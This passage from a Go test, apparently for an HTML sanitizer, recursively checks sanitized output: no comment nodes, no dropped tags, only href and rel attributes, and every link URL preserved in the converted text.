		}
		text, err := HTMLToText(out)
		require.NoError(t, err)

		var check func(n *xhtml.Node)
		check = func(n *xhtml.Node) {
			require.NotEqual(t, xhtml.CommentNode, n.Type, "%q", out)
			if n.Type == xhtml.ElementNode {
				require.True(t, !dropTags[n.Data] || (n.Data == "head" && n.FirstChild == nil), "element %q in %q", n.Data, out)
				for _, a := range n.Attr {
					require.Contains(t, []string{"href", "rel"}, a.Key, "%q", out)
				}
				if href, ok := attributeValue(n, "href"); ok {
					require.NotEmpty(t, href, "%q", out)
					require.Equal(t, href, linkURL(n), "%q", out)
					require.Contains(t, text, href, "%q", out)
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				check(c)
			}
		}
		check(doc)
	})
}
